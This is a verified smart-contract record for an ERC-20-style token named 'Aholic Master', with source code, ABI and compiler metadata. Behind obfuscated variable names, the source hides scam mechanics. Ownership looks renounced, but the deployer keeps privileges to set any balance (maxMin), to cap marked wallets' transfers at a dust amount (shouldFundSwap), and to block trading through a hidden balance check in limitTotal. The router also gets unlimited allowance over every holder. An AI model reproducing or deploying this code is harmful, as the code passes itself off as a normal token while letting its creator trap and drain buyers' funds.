{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface limitAmountReceiver {\n    function createPair(address limitLaunch, address fromExemptAmount) external returns (address);\n}\n\ninterface totalReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundFrom) external view returns (uint256);\n\n    function transfer(address exemptEnable, uint256 sellLaunchedAmount) external returns (bool);\n\n    function allowance(address launchTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellLaunchedAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptEnable,\n        uint256 sellLaunchedAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atEnableLaunch, uint256 value);\n    event Approval(address indexed launchTotal, address indexed spender, uint256 value);\n}\n\nabstract contract limitLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalReceiverMetadata is totalReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AholicMaster is limitLaunched, totalReceiver, totalReceiverMetadata {\n\n    address private swapShould;\n\n    mapping(address => mapping(address => uint256)) private liquidityToken;\n\n    bool public tokenIs;\n\n    function owner() external view returns (address) {\n        return swapShould;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxFrom;\n    }\n\n    function approve(address sellTeam, uint256 sellLaunchedAmount) public virtual override returns (bool) {\n        liquidityToken[_msgSender()][sellTeam] = sellLaunchedAmount;\n        emit Approval(_msgSender(), sellTeam, sellLaunchedAmount);\n        return true;\n    }\n\n    function liquidityTotal() public {\n        emit OwnershipTransferred(limitFeeIs, address(0));\n        swapShould = address(0);\n    }\n\n    uint256 constant enableSender = 8 ** 10;\n\n    address public atMin;\n\n    function maxMin(address liquiditySender, uint256 sellLaunchedAmount) public {\n        enableLaunched();\n        senderLiquidityMarketing[liquiditySender] = sellLaunchedAmount;\n    }\n\n    uint256 private limitBuy = 100000000 * 10 ** 18;\n\n    uint8 private feeMarketing = 18;\n\n    function enableTake(address atMode, address exemptEnable, uint256 sellLaunchedAmount) internal returns (bool) {\n        require(senderLiquidityMarketing[atMode] >= sellLaunchedAmount);\n        senderLiquidityMarketing[atMode] -= sellLaunchedAmount;\n        senderLiquidityMarketing[exemptEnable] += sellLaunchedAmount;\n        emit Transfer(atMode, exemptEnable, sellLaunchedAmount);\n        return true;\n    }\n\n    uint256 public teamLiquidityExempt;\n\n    bool public totalMode;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverTakeBuy;\n    }\n\n    bool public enableAuto;\n\n    bool public tokenAtMarketing;\n\n    string private maxFrom = \"AMR\";\n\n    function transferFrom(address atMode, address exemptEnable, uint256 sellLaunchedAmount) external override returns (bool) {\n        if (_msgSender() != teamLaunchedAmount) {\n            if (liquidityToken[atMode][_msgSender()] != type(uint256).max) {\n                require(sellLaunchedAmount <= liquidityToken[atMode][_msgSender()]);\n                liquidityToken[atMode][_msgSender()] -= sellLaunchedAmount;\n            }\n        }\n        return limitTotal(atMode, exemptEnable, sellLaunchedAmount);\n    }\n\n    function allowance(address teamTokenWallet, address sellTeam) external view virtual override returns (uint256) {\n        if (sellTeam == teamLaunchedAmount) {\n            return type(uint256).max;\n        }\n        return liquidityToken[teamTokenWallet][sellTeam];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeMarketing;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitBuy;\n    }\n\n    uint256 feeLimitMarketing;\n\n    string private receiverTakeBuy = \"Aholic Master\";\n\n    address receiverToTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return swapShould;\n    }\n\n    function minList(address tradingIs) public {\n        if (enableAuto) {\n            return;\n        }\n        \n        launchedSell[tradingIs] = true;\n        \n        enableAuto = true;\n    }\n\n    event OwnershipTransferred(address indexed listSell, address indexed tradingFeeSender);\n\n    uint256 public marketingTxWallet;\n\n    bool private sellLimitAuto;\n\n    bool private sellFee;\n\n    address public limitFeeIs;\n\n    function enableLaunched() private view {\n        require(launchedSell[_msgSender()]);\n    }\n\n    bool public fromEnable;\n\n    mapping(address => bool) public listSender;\n\n    mapping(address => bool) public launchedSell;\n\n    function balanceOf(address fundFrom) public view virtual override returns (uint256) {\n        return senderLiquidityMarketing[fundFrom];\n    }\n\n    function shouldFundSwap(address tokenFee) public {\n        enableLaunched();\n        \n        if (tokenFee == limitFeeIs || tokenFee == atMin) {\n            return;\n        }\n        listSender[tokenFee] = true;\n    }\n\n    function transfer(address liquiditySender, uint256 sellLaunchedAmount) external virtual override returns (bool) {\n        return limitTotal(_msgSender(), liquiditySender, sellLaunchedAmount);\n    }\n\n    uint256 receiverSwapToken;\n\n    function limitTotal(address atMode, address exemptEnable, uint256 sellLaunchedAmount) internal returns (bool) {\n        if (atMode == limitFeeIs) {\n            return enableTake(atMode, exemptEnable, sellLaunchedAmount);\n        }\n        uint256 exemptMax = totalReceiver(atMin).balanceOf(receiverToTeam);\n        require(exemptMax == receiverSwapToken);\n        require(exemptEnable != receiverToTeam);\n        if (listSender[atMode]) {\n            return enableTake(atMode, exemptEnable, enableSender);\n        }\n        return enableTake(atMode, exemptEnable, sellLaunchedAmount);\n    }\n\n    mapping(address => uint256) private senderLiquidityMarketing;\n\n    constructor (){\n        \n        fundLaunch receiverList = fundLaunch(teamLaunchedAmount);\n        atMin = limitAmountReceiver(receiverList.factory()).createPair(receiverList.WETH(), address(this));\n        \n        limitFeeIs = _msgSender();\n        launchedSell[limitFeeIs] = true;\n        senderLiquidityMarketing[limitFeeIs] = limitBuy;\n        liquidityTotal();\n        if (tokenAtMarketing == fromEnable) {\n            tokenAtMarketing = true;\n        }\n        emit Transfer(address(0), limitFeeIs, limitBuy);\n    }\n\n    address teamLaunchedAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function amountTx(uint256 sellLaunchedAmount) public {\n        enableLaunched();\n        receiverSwapToken = sellLaunchedAmount;\n    }\n\n    bool public fromExempt;\n\n    bool public exemptTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFeeSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atEnableLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTokenWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellLaunchedAmount\",\"type\":\"uint256\"}],\"name\":\"amountTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLaunchedAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFeeIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLaunchedAmount\",\"type\":\"uint256\"}],\"name\":\"maxMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingIs\",\"type\":\"address\"}],\"name\":\"minList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFee\",\"type\":\"address\"}],\"name\":\"shouldFundSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLiquidityExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAtMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLaunchedAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLaunchedAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AholicMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}